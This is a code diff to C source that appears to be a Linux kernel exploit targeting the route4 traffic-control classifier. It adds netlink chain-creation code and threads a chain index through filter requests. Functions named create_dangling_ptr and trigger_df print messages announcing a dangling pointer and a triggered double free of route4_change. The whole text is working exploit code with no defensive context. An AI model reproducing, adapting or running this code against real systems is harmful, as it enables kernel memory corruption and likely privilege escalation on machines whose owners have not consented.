@@ -48,6 +48,36 @@ static int addattr_nest_end(struct nlmsghdr *n, struct rtattr *nest)
   return n->nlmsg_len;
 }
 
+static int create_chain(int fd, u_int32_t chain_idx)
+{
+    char *start = malloc(0x1000);
+    memset(start, 0, 0x1000);
+    struct nlmsghdr *msg = (struct nlmsghdr *)start;
+
+    msg->nlmsg_len = NLMSG_LENGTH(sizeof(struct tcmsg));
+    msg->nlmsg_flags = NLM_F_REQUEST | NLM_F_CREATE | NLM_F_EXCL;
+    msg->nlmsg_type = RTM_NEWCHAIN; 
+    
+    struct tcmsg *t = (struct tcmsg *)(start + sizeof(struct nlmsghdr));
+    t->tcm_ifindex = 1;
+    t->tcm_family = AF_UNSPEC;
+    t->tcm_parent = TC_H_MAKE(1 << 16, 0);
+
+    addattr_l(msg, 0x1000, TCA_CHAIN, &chain_idx, 4);
+
+    struct iovec iov = {.iov_base = msg, .iov_len = msg->nlmsg_len};
+    struct sockaddr_nl nladdr = {.nl_family = AF_NETLINK};
+    struct msghdr msgh = {
+        .msg_name = &nladdr,
+        .msg_namelen = sizeof(nladdr),
+        .msg_iov = &iov,
+        .msg_iovlen = 1,
+    };
+    int ret = sendmsg(fd, &msgh, 0);
+    free(start);
+    return ret;
+}
+
 static int add_qdisc(int fd)
 {
     char *start = malloc(0x1000);
@@ -64,6 +94,7 @@ static int add_qdisc(int fd)
     t->tcm_ifindex = 1;
     t->tcm_family = AF_UNSPEC;
     t->tcm_parent = TC_H_ROOT;
+    t->tcm_handle = TC_H_MAKE(1 << 16, 0);
 
     // prio, protocol
     u_int32_t prio = 1;
@@ -85,7 +116,7 @@ static int add_qdisc(int fd)
 
 
 static int add_tc_(int fd, u_int32_t from, u_int32_t to,
-        u_int32_t handle, u_int16_t flags)
+        u_int32_t handle, u_int16_t flags, u_int32_t chain_idx)
 {
     char *start = malloc(0x2000);
     memset(start, 0, 0x2000);
@@ -105,6 +136,8 @@ static int add_tc_(int fd, u_int32_t from, u_int32_t to,
     t->tcm_ifindex = 1;
     t->tcm_family = AF_UNSPEC;
     t->tcm_handle = handle;
+
+    addattr_l(msg, 0x2000, TCA_CHAIN, &chain_idx, 4);
 
     addattr_l(msg, 0x1000, TCA_KIND, "route", 6);
     struct rtattr *tail = addattr_nest(msg, 0x1000, TCA_OPTIONS);
@@ -133,20 +166,25 @@ void init_route4()
     sockfd = socket(PF_NETLINK, SOCK_RAW, 0);
     assert(sockfd > 0);
     add_qdisc(sockfd);
+    create_chain(sockfd, 69);
+    u_int8_t from = 0x7f;
+    u_int8_t to = 0xff;
+    u_int32_t handle = ((0 & from) << 16) | (0 & to);
+    add_tc_(sockfd, from, to, handle, NLM_F_EXCL | NLM_F_CREATE, 69);
     printf("[+][%s] Qdisc added\n", __FILE__);
 }
 
 void create_dangling_ptr()
 {
-    add_tc_(sockfd, 0, 0, 0, NLM_F_EXCL | NLM_F_CREATE);
-    add_tc_(sockfd, 1, 2, 0, NLM_F_CREATE);
+    add_tc_(sockfd, 0, 0, 0, NLM_F_EXCL | NLM_F_CREATE, 69);
+    add_tc_(sockfd, 1, 2, 0, NLM_F_CREATE, 69);
     usleep(500 * 1000);
     printf("[+][%s] Dangling ptr created\n", __FILE__);
 }
 
 void trigger_df()
 {
-    add_tc_(sockfd, 1, 3, 0, NLM_F_CREATE);
+    add_tc_(sockfd, 1, 3, 0, NLM_F_CREATE, 69);
     usleep(500 * 1000);
     printf("[+][%s] Double free of route4_change triggered\n", __FILE__);
 }
